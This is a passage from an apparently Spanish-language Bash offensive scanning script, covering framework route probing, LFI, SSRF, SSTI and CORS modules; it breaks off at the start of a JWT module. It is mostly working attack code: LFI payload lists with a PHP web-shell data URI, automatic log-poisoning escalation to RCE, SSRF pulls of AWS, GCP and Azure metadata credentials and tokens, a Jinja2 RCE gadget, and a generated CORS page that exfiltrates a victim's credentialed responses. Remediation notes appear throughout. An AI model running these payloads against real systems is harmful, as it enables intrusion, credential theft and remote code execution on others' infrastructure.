            INTEL_FRAMEWORK_ROUTES+=("/api" "/api/json" "/swagger" "/swagger-ui" "/.env" "/health" "/metrics" "/graphql")
            intel_log "NestJS: /api (Swagger auto-gen) registrado"
            ;;
        aspnet)
            INTEL_FRAMEWORK_ROUTES+=("/trace.axd" "/elmah.axd" "/webresource.axd" "/ScriptResource.axd" "/admin/" "/web.config" "/app_offline.htm" "/elmah/" "/glimpse.axd")
            intel_log "ASP.NET: trace.axd, elmah.axd registrados → info disclosure"
            ;;
        dotnetcore)
            INTEL_FRAMEWORK_ROUTES+=("/swagger" "/swagger/v1/swagger.json" "/healthz" "/health" "/metrics" "/liveness" "/readiness" "/_framework/" "/appsettings.json")
            intel_log ".NET Core: /swagger, /healthz, /metrics registrados"
            ;;
        rails)
            INTEL_FRAMEWORK_ROUTES+=("/rails/info" "/rails/mailers" "/rails/conductor" "/.env" "/config/database.yml" "/config/secrets.yml" "/db/schema.rb")
            intel_log "Rails: /rails/info registrado → info disclosure"
            ;;
        express)
            INTEL_FRAMEWORK_ROUTES+=("/api/" "/api/v1/" "/api/v2/" "/.env" "/package.json" "/package-lock.json" "/node_modules/" "/config.js" "/app.js")
            intel_log "Express: /package.json, .env registrados"
            ;;
    esac

    # Windows IIS específico
    if [[ "$INTEL_OS" == "windows" ]] || [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " iis " ]]; then
        INTEL_FRAMEWORK_ROUTES+=("/iisstart.htm" "/welcome.png" "/_vti_bin/shtml.dll" "/_vti_inf.html" "/postinfo.html" "/robots.txt" "/web.config" "/bin/")
        intel_log "IIS Windows: rutas específicas registradas"
    fi

    intel_log "Framework routes totales: ${#INTEL_FRAMEWORK_ROUTES[@]}"
}

# ─── MÓDULO 30: FRAMEWORK DEEP SCAN ──────────────────────────────
modulo_framework_scan() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    [[ -z "$INTEL_FRAMEWORK_JS" && -z "$INTEL_FRAMEWORK_BACKEND" && -z "$INTEL_CMS" ]] && {
        warn "Sin framework detectado. Ejecuta whatweb primero (módulo 6)."
        return
    }

    log "MÓDULO 30: Framework Deep Scan — Rutas Críticas por Stack"
    tip "Cada framework expone rutas y archivos sensibles únicos. Este módulo los busca todos."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/framework_scan.txt"
    local hits=0
    local hits_html=""

    # Construir rutas si aún no están
    [[ ${#INTEL_FRAMEWORK_ROUTES[@]} -eq 0 ]] && _build_framework_routes "$base_url"

    intel_log "Probando ${#INTEL_FRAMEWORK_ROUTES[@]} rutas del framework ${INTEL_FRAMEWORK_JS:-}${INTEL_FRAMEWORK_BACKEND:-}"

    for route in "${INTEL_FRAMEWORK_ROUTES[@]}"; do
        local full_url="${base_url%/}${route}"
        local status
        status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "$full_url" 2>/dev/null)

        if [[ "$status" == "200" || "$status" == "301" || "$status" == "302" || "$status" == "403" ]]; then
            echo "[${status}] ${full_url}" | tee -a "$out_file"
            ((hits++))

            # Clasificar por peligrosidad
            local sev="INFO" cvss="N/A"
            if echo "$route" | grep -qiE "\.env|config|secret|credential|password|token|key|\.git|laravel\.log|database\.yml|web\.config|appsettings"; then
                sev="CRÍTICO"; cvss="9.5"
            elif echo "$route" | grep -qiE "telescope|horizon|_profiler|console|trace\.axd|elmah|debug|admin"; then
                sev="ALTO"; cvss="7.5"
            elif echo "$route" | grep -qiE "swagger|docs|redoc|openapi|healthz|metrics"; then
                sev="MEDIO"; cvss="5.3"
            fi

            if [[ "$sev" != "INFO" ]]; then
                local content_preview
                content_preview=$(curl -skL --max-time 8 "$full_url" 2>/dev/null | head -c 500)
                local rem="" ns=""

                case "$route" in
                    *".env"*)
                        rem="Eliminar .env del webroot. Usar variables de entorno del sistema o secretos de CI/CD."
                        ns="cat ${full_url} | grep -iE 'DB_|SECRET|KEY|PASS|TOKEN'"
                        ;;
                    *"telescope"*|*"horizon"*)
                        rem="Proteger Laravel Telescope/Horizon con middleware de autenticación. Solo para admins."
                        ns="Acceder a ${full_url} para ver requests, jobs, queries en tiempo real"
                        ;;
                    *"_profiler"*|*"_wdt"*)
                        rem="Deshabilitar Symfony Profiler en producción: APP_ENV=prod en .env"
                        ns="Explorar ${full_url} para ver queries SQL, variables de sesión, requests"
                        ;;
                    *"trace.axd"*|*"elmah"*)
                        rem="Deshabilitar trace.axd y ELMAH en web.config de producción."
                        ns="curl ${full_url} para ver stack traces y errores de aplicación"
                        ;;
                    *"swagger"*|*"docs"*|*"redoc"*)
                        rem="Deshabilitar swagger en producción o proteger con autenticación."
                        ns="Parsear ${full_url}/openapi.json para extraer todos los endpoints y parámetros"
                        ;;
                esac

                add_finding "$sev" \
                    "[$status] Ruta Crítica de Framework Expuesta: ${route}" \
                    "<b>URL:</b> ${full_url}<br><b>HTTP:</b> ${status}<br><pre>${content_preview}</pre>" \
                    "$cvss" "$rem" "$ns"

                # INTEL: guardar para pruebas adicionales
                INTEL_SENSITIVE_PATHS+=("$full_url")
                [[ "$route" =~ (openapi|swagger) ]] && INTEL_SWAGGER_URL="$full_url"
            fi

            hits_html+="<tr><td>${status}</td><td><a href='${full_url}'>${route}</a></td><td style='color:$([ "$sev" = "CRÍTICO" ] && echo "#ff2d2d" || echo "#ffd23f")'>${sev}</td></tr>"

            [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
        fi
    done

    ok "Framework scan: ${hits} rutas encontradas"
    [[ $hits -gt 0 ]] && add_finding "MEDIO" \
        "Framework Scan: ${hits} rutas accesibles (${INTEL_FRAMEWORK_JS:-}${INTEL_FRAMEWORK_BACKEND:-})" \
        "<table class='vuln-table'><tr><th>HTTP</th><th>Ruta</th><th>Severidad</th></tr>${hits_html}</table>" \
        "5.0" \
        "Auditar cada ruta encontrada. Deshabilitar o proteger las de debug/admin en producción." \
        "Probar cada ruta con arjun para parámetros ocultos y con SQLi/XSS básico"
    echo
}

# ─── MÓDULO 31: LFI / PATH TRAVERSAL ─────────────────────────────
modulo_lfi() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 31: LFI / Path Traversal"
    tip "LFI es crítico en PHP/Python. Con log poisoning puede escalar a RCE."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/lfi_results.txt"
    local found=0

    # Payloads LFI — Linux y Windows
    local LFI_PAYLOADS=(
        "../../../etc/passwd"
        "../../../../etc/passwd"
        "../../../../../etc/passwd"
        "..%2F..%2F..%2Fetc%2Fpasswd"
        "..%252F..%252F..%252Fetc%252Fpasswd"
        "....//....//....//etc/passwd"
        "..././..././..././etc/passwd"
        "php://filter/convert.base64-encode/resource=index.php"
        "php://filter/read=string.rot13/resource=index.php"
        "php://input"
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        "expect://id"
        "file:///etc/passwd"
        # Windows
        "..\\..\\..\\windows\\win.ini"
        "..%5C..%5C..%5Cwindows%5Cwin.ini"
        "C:\\windows\\win.ini"
        "/proc/self/environ"
        "/proc/self/cmdline"
        "/var/log/apache2/access.log"
        "/var/log/nginx/access.log"
    )

    # Indicadores de éxito
    local SUCCESS_PATTERNS=(
        "root:x:0:0"
        "bin:x:1:1"
        "www-data"
        "[extensions]"
        "for 16-bit"
        "base64_encoded"
    )

    # Parámetros comunes para LFI
    local LFI_PARAMS=("file" "page" "include" "path" "document" "folder" "root" "pg" "style" "pdf" "template" "php_path" "doc" "view" "content" "layout" "mod" "conf")

    # Agregar parámetros descubiertos por arjun
    if [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]]; then
        intel_log "LFI: usando ${#INTEL_INJECTABLE_URLS[@]} URLs de gobuster/arjun"
    fi

    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")

    # Construir URLs de prueba con parámetros típicos
    for param in "${LFI_PARAMS[@]}"; do
        test_urls+=("${base_url}/?${param}=test")
        [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " php " ]] && \
            test_urls+=("${base_url}/index.php?${param}=test")
    done

    for test_url in "${test_urls[@]:0:20}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
        [[ -z "$param" ]] && continue

        local ALL_LFI=("${LFI_PAYLOADS[@]}" "${INTEL_EXTRA_PAYLOADS_LFI[@]}")
        [[ ${#INTEL_EXTRA_PAYLOADS_LFI[@]} -gt 0 ]] &&             intel_log "LFI: +${#INTEL_EXTRA_PAYLOADS_LFI[@]} payloads custom"

        for payload in "${ALL_LFI[@]:0:12}"; do
            local probe_url="${test_url%=*}=${payload}"
            local response
            response=$(curl -skL --max-time 10 "$probe_url" 2>/dev/null)

            for pattern in "${SUCCESS_PATTERNS[@]}"; do
                if echo "$response" | grep -q "$pattern"; then
                    warn "LFI DETECTADO: ${probe_url} → ${pattern}"
                    echo "LFI: ${probe_url}" >> "$out_file"
                    ((found++))

                    INTEL_LFI_FOUND=true
                    register_payload "LFI" "${lfi_payload}" "${lfi_url}" "Archivo leído: $(echo "$resp" | head -1)"
                    INTEL_LFI_PARAM="$param"
                    INTEL_LFI_URL="${test_url%=*}="

                    add_finding "CRÍTICO" \
                        "Local File Inclusion (LFI) Confirmado" \
                        "<b>URL:</b> ${probe_url}<br><b>Parámetro:</b> ${param}<br><b>Evidencia:</b> <pre>${response:0:300}</pre>" \
                        "9.8" \
                        "1) Validar parámetros de archivo con lista blanca. 2) Usar realpath() + verificar que esté dentro del directorio permitido. 3) Nunca incluir archivos basados en input del usuario directamente." \
                        "Escalar a RCE: Log poisoning → curl -H 'User-Agent: <?php system(\$_GET[cmd]); ?>' ${base_url} y luego LFI a /var/log/apache2/access.log?cmd=id"

                    intel_log "LFI confirmado → escalando a RFI y log poisoning"
                    break 2
                fi
            done

            [[ "$INTEL_SCAN_DELAY" -gt 0 ]] && sleep "0.${INTEL_SCAN_DELAY}"
        done
        [[ "$INTEL_LFI_FOUND" == "true" ]] && break
    done

    # Si LFI encontrado → escalar automáticamente
    if [[ "$INTEL_LFI_FOUND" == "true" ]]; then
        _escalate_lfi "$base_url"
    else
        ok "LFI: sin indicios detectados con payloads básicos."
        add_finding "INFO" "LFI / Path Traversal" "Sin LFI detectado en parámetros probados." \
            "N/A" \
            "Revisar manualmente parámetros que incluyan archivos (file=, page=, path=, include=)." \
            "Probar con Burp Intruder y wordlist de LFI de SecLists: /usr/share/seclists/Fuzzing/LFI/"
    fi
    echo
}

# Helper: Escalar LFI a más vectores
_escalate_lfi() {
    local base_url="$1"
    local lfi_base="${INTEL_LFI_URL}"
    [[ -z "$lfi_base" ]] && return

    intel_log "Escalando LFI: intentando RFI, wrappers PHP, log poisoning..."
    local escalation_html=""

    # PHP wrappers
    local php_wrappers=(
        "php://filter/convert.base64-encode/resource=index.php"
        "php://filter/convert.base64-encode/resource=../config.php"
        "php://filter/convert.base64-encode/resource=../.env"
        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        "data://text/plain,<?php phpinfo(); ?>"
        "zip://shell.zip%23shell.php"
    )

    for wrapper in "${php_wrappers[@]}"; do
        local resp
        resp=$(curl -skL --max-time 8 "${lfi_base}${wrapper}" 2>/dev/null)
        if echo "$resp" | grep -qiE "base64|phpinfo|PHP Version|root:"; then
            add_finding "CRÍTICO" \
                "LFI Escalado: PHP Wrapper Funcional — ${wrapper%%/*}" \
                "<b>Wrapper:</b> ${wrapper}<br><pre>${resp:0:400}</pre>" \
                "10.0" \
                "Deshabilitar allow_url_include y allow_url_fopen en php.ini. Usar open_basedir." \
                "Leer código fuente: ${lfi_base}php://filter/convert.base64-encode/resource=ARCHIVO | base64 -d"
            escalation_html+="<li>PHP Wrapper: ${wrapper%%/*} ✅</li>"
            break
        fi
    done

    # Log poisoning
    local log_files=("/var/log/apache2/access.log" "/var/log/nginx/access.log" "/var/log/httpd/access_log" "/proc/self/environ" "/var/log/mail.log")
    for logf in "${log_files[@]}"; do
        local resp
        resp=$(curl -skL --max-time 5 "${lfi_base}${logf}" 2>/dev/null)
        if echo "$resp" | grep -qiE "GET|POST|HTTP|User-Agent|mozilla"; then
            add_finding "CRÍTICO" \
                "Log Poisoning Posible via LFI — ${logf}" \
                "<b>Log accesible:</b> ${logf}<br>Inyectar código PHP en logs para RCE completo." \
                "10.0" \
                "Corregir el LFI base. Restringir open_basedir. Logs no deben estar en webroot." \
                "RCE: 1) curl -H 'User-Agent: \`<?php system(\$_GET[\"c\"]); ?>\`' ${base_url} | 2) ${lfi_base}${logf}&c=id"
            escalation_html+="<li>Log Poisoning via ${logf} ✅</li>"
            break
        fi
    done

    [[ -n "$escalation_html" ]] && \
        add_finding "CRÍTICO" "LFI Escalación Exitosa" \
            "<ul>${escalation_html}</ul>" "10.0" \
            "Corregir LFI base inmediatamente. Ver hallazgos individuales." \
            "Intentar reverse shell via LFI+Log Poisoning"
}



# ─── MÓDULO 32: SSRF ─────────────────────────────────────────────
modulo_ssrf() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 32: SSRF — Server-Side Request Forgery"
    tip "SSRF está en OWASP Top 10. Permite acceder a infraestructura interna y metadata de cloud."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/ssrf_results.txt"

    # Parámetros típicos de SSRF
    local SSRF_PARAMS=("url" "uri" "path" "src" "source" "href" "link" "redirect" "next" "return" "target" "dest" "destination" "redir" "callback" "fetch" "load" "proxy" "remote" "request" "to" "out" "from" "u" "image" "img" "endpoint" "api" "host" "server" "page")
    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")
    for param in "${SSRF_PARAMS[@]}"; do
        test_urls+=("${base_url}/?${param}=test")
    done

    # Payloads SSRF para detección básica (blind + semi-blind)
    local SSRF_PROBES=(
        "http://127.0.0.1/"
        "http://localhost/"
        "http://0.0.0.0/"
        "http://[::1]/"
        "http://127.1/"
        "http://2130706433/"
    )

    local found=0
    for test_url in "${test_urls[@]:0:15}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
        [[ -z "$param" ]] && continue

        for probe in "${SSRF_PROBES[@]}"; do
            local probe_url="${test_url%=*}=${probe}"
            local resp
            resp=$(curl -skL --max-time 8 "$probe_url" 2>/dev/null)
            local status
            status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "$probe_url" 2>/dev/null)

            # Detectar respuesta interna
            if echo "$resp" | grep -qiE "root:|bin:|localhost|127\\.0\\.0|internal|private|admin|dashboard|api|health" && [[ "$status" != "400" && "$status" != "422" ]]; then
                warn "SSRF DETECTADO: ${probe_url}"
                echo "SSRF: ${probe_url}" >> "$out_file"
                ((found++))

                INTEL_SSRF_FOUND=true
                register_payload "SSRF" "${probe}" "${test_url}" "Respuesta interna detectada"
                INTEL_SSRF_URL="${test_url%=*}="

                add_finding "CRÍTICO" \
                    "SSRF Confirmado — Acceso a Recursos Internos" \
                    "<b>URL:</b> ${probe_url}<br><b>Parámetro:</b> ${param}<br><b>Respuesta:</b><pre>${resp:0:400}</pre>" \
                    "9.8" \
                    "1) Validar y sanitizar URLs con lista blanca de dominios permitidos. 2) Bloquear rangos de IP privados (127.x, 10.x, 172.16-31.x, 192.168.x). 3) Deshabilitar redireccionamientos automáticos. 4) Usar un proxy de salida con filtrado." \
                    "Escalar: probar metadata cloud → ${INTEL_SSRF_URL}http://169.254.169.254/latest/meta-data/"

                intel_log "SSRF confirmado → probando metadata cloud"
                _escalate_ssrf
                break 2
            fi
        done
    done

    if [[ $found -eq 0 ]]; then
        ok "SSRF: sin indicios básicos en parámetros URL probados."
        add_finding "INFO" "SSRF" "Sin SSRF básico detectado. Requiere prueba manual en funcionalidades de fetch/webhook." \
            "N/A" \
            "Revisar manualmente: webhooks, importar URL, generar PDF desde URL, preview de links." \
            "Usar Burp Collaborator o interactsh para SSRF blind: https://app.interactsh.com"
    fi
    echo
}

_escalate_ssrf() {
    local ssrf_base="${INTEL_SSRF_URL}"
    [[ -z "$ssrf_base" ]] && return
    intel_log "SSRF → probando acceso a metadata de cloud provider..."

    # AWS metadata
    local AWS_META="http://169.254.169.254/latest/meta-data/"
    local aws_resp
    aws_resp=$(curl -skL --max-time 8 "${ssrf_base}${AWS_META}" 2>/dev/null)
    if echo "$aws_resp" | grep -qiE "ami-id|instance-id|hostname|security-credentials|iam"; then
        intel_log "AWS Metadata accesible via SSRF!"
        local aws_creds
        aws_creds=$(curl -skL --max-time 8 "${ssrf_base}http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
        add_finding "CRÍTICO" \
            "SSRF → AWS Metadata Service Accesible (IMDS)" \
            "<b>Metadata:</b><pre>${aws_resp:0:300}</pre><b>Roles IAM:</b><pre>${aws_creds:0:200}</pre>" \
            "10.0" \
            "1) Requerir IMDSv2 (token obligatorio): aws ec2 modify-instance-metadata-options --http-tokens required. 2) Corregir la vulnerabilidad SSRF base." \
            "Extraer credenciales temporales: ${ssrf_base}http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
        INTEL_CLOUD_PROVIDER="aws"
    fi

    # GCP metadata
    local gcp_resp
    gcp_resp=$(curl -skL --max-time 8 -H "Metadata-Flavor: Google" "${ssrf_base}http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null)
    if echo "$gcp_resp" | grep -qiE "zone|id|name|service-accounts"; then
        add_finding "CRÍTICO" \
            "SSRF → GCP Metadata Service Accesible" \
            "<pre>${gcp_resp:0:400}</pre>" \
            "10.0" \
            "Usar Metadata Concealment. Corregir SSRF base. Deshabilitar metadatos de legacy." \
            "Token OAuth: ${ssrf_base}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        INTEL_CLOUD_PROVIDER="gcp"
    fi

    # Azure metadata
    local az_resp
    az_resp=$(curl -skL --max-time 8 -H "Metadata: true" "${ssrf_base}http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
    if echo "$az_resp" | grep -qiE "subscriptionId|resourceGroupName|location|vmId"; then
        add_finding "CRÍTICO" \
            "SSRF → Azure Instance Metadata Service Accesible" \
            "<pre>${az_resp:0:400}</pre>" \
            "10.0" \
            "Usar Azure IMDS con Required Headers en nivel de NIC. Corregir SSRF base." \
            "Token: ${ssrf_base}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        INTEL_CLOUD_PROVIDER="azure"
    fi

    # Internal services via SSRF
    local internal_probes=(
        "http://127.0.0.1:6379/"         # Redis
        "http://127.0.0.1:9200/"         # Elasticsearch
        "http://127.0.0.1:2375/v1.41/info"  # Docker API
        "http://127.0.0.1:8080/"         # Internal app
        "http://127.0.0.1:3306/"         # MySQL
        "http://127.0.0.1:27017/"        # MongoDB
    )
    for svc in "${internal_probes[@]}"; do
        local svc_resp
        svc_resp=$(curl -skL --max-time 5 "${ssrf_base}${svc}" 2>/dev/null)
        if echo "$svc_resp" | grep -qiE "redis|elastic|docker|mysql|mongo|OK|version|PONG"; then
            local svc_name="${svc##*:}"
            add_finding "CRÍTICO" \
                "SSRF → Servicio Interno Expuesto: ${svc}" \
                "<pre>${svc_resp:0:300}</pre>" \
                "10.0" \
                "Segmentar red interna. Corregir SSRF. Usar firewall para bloquear acceso a servicios internos desde la app web." \
                "Explotar: ${ssrf_base}${svc}"
        fi
    done
}

# ─── MÓDULO 33: SSTI ─────────────────────────────────────────────
modulo_ssti() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    # Solo si hay backend de template engine detectado
    local has_template=false
    [[ " ${INTEL_FRAMEWORK_BACKEND[*]}$INTEL_FRAMEWORK_BACKEND " =~ "flask|django|fastapi|symfony|laravel|rails|jinja|twig|smarty|erb" ]] && has_template=true
    [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]] && has_template=true
    [[ "$has_template" == "false" ]] && { warn "SSTI: sin template engine detectado. Saltando (activa con módulo custom)."; return; }

    log "MÓDULO 33: SSTI — Server-Side Template Injection"
    tip "SSTI en Jinja2/Twig/Smarty/ERB = RCE. Una de las vulns más críticas."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/ssti_results.txt"

    # Payloads por engine — expresiones matemáticas que deben evaluarse
    declare -A SSTI_PAYLOADS
    SSTI_PAYLOADS["Jinja2/Flask"]='{{7*7}} {{config}} {{self.__dict__}}'
    SSTI_PAYLOADS["Twig/Symfony"]='{{7*7}} {{7*"7"}} #{7*7}'
    SSTI_PAYLOADS["Smarty/PHP"]='{{7*7}} {php}echo 7*7;{/php} {$smarty.version}'
    SSTI_PAYLOADS["ERB/Rails"]='<%= 7*7 %> <%= system("id") %>'
    SSTI_PAYLOADS["Freemarker"]='${7*7} ${"freemarker.template.utility.Execute"?new()("id")}'
    SSTI_PAYLOADS["Pebble"]='{{7*7}} {%for i in range(3)%}{{i}}{%endfor%}'

    local DETECT_PROBES=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}' '@(7*7)' '${{7*7}}')
    local EXPECTED="49"

    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")
    [[ ${#test_urls[@]} -eq 0 ]] && test_urls+=("${base_url}/?q=test" "${base_url}/?search=test" "${base_url}/?name=test" "${base_url}/?msg=test")

    local found=0
    for test_url in "${test_urls[@]:0:15}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
        [[ -z "$param" ]] && continue

        for probe in "${DETECT_PROBES[@]}"; do
            local encoded_probe
            encoded_probe=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${probe}'))" 2>/dev/null || echo "$probe")
            local probe_url="${test_url%=*}=${encoded_probe}"
            local resp
            resp=$(curl -skL --max-time 10 "$probe_url" 2>/dev/null)

            if echo "$resp" | grep -q "$EXPECTED"; then
                warn "SSTI DETECTADO: ${probe} evaluado a ${EXPECTED} en ${probe_url}"
                echo "SSTI: ${probe_url}" >> "$out_file"
                ((found++))
                INTEL_SSTI_FOUND=true

                # Detectar el engine
                local engine="Desconocido"
                [[ "$probe" =~ "{{" ]] && [[ " ${INTEL_FRAMEWORK_BACKEND} " =~ "flask|django|fastapi" ]] && engine="Jinja2 (Python)"
                [[ "$probe" =~ "{{" ]] && [[ " ${INTEL_FRAMEWORK_BACKEND} " =~ "symfony|twig" ]] && engine="Twig (PHP)"
                [[ "$probe" =~ "<%" ]] && engine="ERB (Ruby/Rails)"
                [[ "$probe" =~ '${' ]] && engine="Freemarker/Pebble/Thymeleaf"

                add_finding "CRÍTICO" \
                    "SSTI Confirmado — Template Injection (${engine})" \
                    "<b>URL:</b> ${probe_url}<br><b>Payload:</b> ${probe}<br><b>Evaluó a:</b> ${EXPECTED}<br><b>Engine probable:</b> ${engine}" \
                    "10.0" \
                    "1) NUNCA renderizar input de usuario como template. 2) Usar render_template_string con escape. 3) Sandboxear el entorno Jinja2: SandboxedEnvironment(). 4) Validar y sanitizar toda entrada antes de usarla en templates." \
                    "RCE en Jinja2: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}} | O usar tplmap: tplmap -u '${probe_url}'"
                break 2
            fi
        done
    done

    if [[ $found -eq 0 ]]; then
        ok "SSTI: sin indicios detectados."
        add_finding "INFO" "SSTI" "Sin template injection detectada en parámetros probados." \
            "N/A" \
            "Revisar manualmente campos de texto libre: mensajes de error personalizados, plantillas de email, comentarios." \
            "Usar tplmap: pip3 install tplmap && tplmap -u 'URL?param=*'"
    fi
    echo
}

# ─── MÓDULO 34: CORS MISCONFIGURATION ────────────────────────────
modulo_cors() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 34: CORS Misconfiguration"
    tip "CORS mal configurado permite que sitios maliciosos lean respuestas API con tus cookies."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/cors_results.txt"

    local TEST_ORIGINS=(
        "https://evil.com"
        "https://evil.${TARGET}"
        "https://${TARGET}.evil.com"
        "null"
        "http://${TARGET}"
        "https://localhost"
        "https://attacker.com"
    )

    local vuln_found=false
    local cors_html=""

    for origin in "${TEST_ORIGINS[@]}"; do
        local resp_headers
        resp_headers=$(curl -skI --max-time 10 \
            -H "Origin: ${origin}" \
            -H "Access-Control-Request-Method: GET" \
            "$base_url" 2>/dev/null)

        local acao
        acao=$(echo "$resp_headers" | grep -i "access-control-allow-origin" | tr -d '\r')
        local acac
        acac=$(echo "$resp_headers" | grep -i "access-control-allow-credentials" | tr -d '\r')

        if [[ -n "$acao" ]]; then
            echo "Origin: ${origin} → ${acao} ${acac}" | tee -a "$out_file"
            cors_html+="<tr><td>${origin}</td><td>${acao}</td><td>${acac}</td></tr>"

            # CRÍTICO: origin reflection + credentials
            if echo "$acao" | grep -qi "$origin" && echo "$acac" | grep -qi "true"; then
                vuln_found=true
                INTEL_CORS_VULN=true
                INTEL_CORS_ORIGIN="$origin"
                add_finding "CRÍTICO" \
                    "CORS: Origin Reflection + Credentials — Robo de Sesión Posible" \
                    "<b>Origin enviado:</b> ${origin}<br><b>Respuesta:</b> ${acao} ${acac}" \
                    "9.3" \
                    "1) No usar Access-Control-Allow-Origin: * con credenciales. 2) Validar Origin con lista blanca estricta. 3) No reflejar automáticamente el Origin recibido." \
                    "PoC generado automáticamente — ver archivo cors_poc.html"
                _generate_cors_poc "$base_url" "$origin"

            # ALTO: wildcard
            elif echo "$acao" | grep -q "\*"; then
                add_finding "ALTO" \
                    "CORS: Wildcard (*) Permite Cualquier Origen" \
                    "<b>Access-Control-Allow-Origin: *</b><br>Cualquier dominio puede leer respuestas de la API." \
                    "7.4" \
                    "Reemplazar * por lista blanca de dominios: Access-Control-Allow-Origin: https://tudominio.com" \
                    "Si hay autenticación con cookies, cambiar a origen específico. Wildcard + credentials no es posible en browser."

            # MEDIO: null origin
            elif echo "$acao" | grep -qi "null" || echo "$origin" | grep -qi "null" && echo "$acao" | grep -qi "null"; then
                add_finding "ALTO" \
                    "CORS: Origen 'null' Permitido" \
                    "El servidor acepta origin: null (usado en iframes sandboxed, archivos locales, redirects)." \
                    "7.0" \
                    "Nunca permitir origin: null en producción. Agregar a lista negra." \
                    "PoC: crear iframe sandbox que realice petición cross-origin con origin: null"
            fi
        fi
    done

    if [[ "$vuln_found" == "false" ]]; then
        ok "CORS: configuración aparentemente correcta."
        add_finding "INFO" "CORS" "No se detectaron misconfiguraciones graves de CORS." \
            "N/A" \
            "Verificar manualmente en endpoints de API con credenciales." \
            "curl -sI -H 'Origin: https://evil.com' ${base_url}/api/ | grep -i cors"
    fi
    echo
}

_generate_cors_poc() {
    local target_url="$1" evil_origin="$2"
    local poc_file="${OUTPUT_DIR}/web/cors_poc.html"
    cat > "$poc_file" << POCEOF
<!DOCTYPE html>
<!-- WriestTavo v8.0 — CORS PoC automático -->
<!-- Hostear en ${evil_origin} para ejecutar el ataque -->
<html>
<head><title>CORS PoC — ${target_url}</title></head>
<body>
<h2>CORS Attack PoC</h2>
<p>Este PoC demuestra que <b>${evil_origin}</b> puede leer respuestas de <b>${target_url}</b></p>
<pre id="output">Ejecutando...</pre>
<script>
fetch('${target_url}', {
    method: 'GET',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' }
})
.then(r => r.text())
.then(data => {
    document.getElementById('output').textContent =
        'ÉXITO — Datos robados de ${target_url}:\n\n' + data.substring(0, 2000);
    console.log('CORS VULN CONFIRMED:', data);
})
.catch(e => document.getElementById('output').textContent = 'Error: ' + e);
</script>
</body>
</html>
POCEOF
    ok "PoC CORS generado: ${poc_file}"
    add_finding "CRÍTICO" \
        "CORS PoC de Ataque Generado" \
        "<b>Archivo:</b> ${poc_file}<br>Hostear en servidor malicioso para demostrar robo de datos cross-origin con credenciales." \
        "9.3" \
        "Ver hallazgo CORS anterior para remediación." \
        "Hostear PoC: python3 -m http.server 8000 en directorio de outputs | Abrir ${poc_file} en navegador víctima"
}



# ─── MÓDULO 35: JWT ANALYSIS + CRACK ─────────────────────────────
modulo_jwt() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 35: JWT Analysis — alg:none, Weak Secret, Confusion"
    tip "JWT mal implementado = bypass de autenticación total. Muy frecuente en APIs."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/jwt_results.txt"

    # Recolectar JWTs de múltiples fuentes
    local all_jwts=("${INTEL_JWT_TOKENS[@]}")

    # Buscar en respuestas HTTP
    local resp_headers
    resp_headers=$(curl -skI --max-time 10 "$base_url" 2>/dev/null)
    local jwt_in_headers
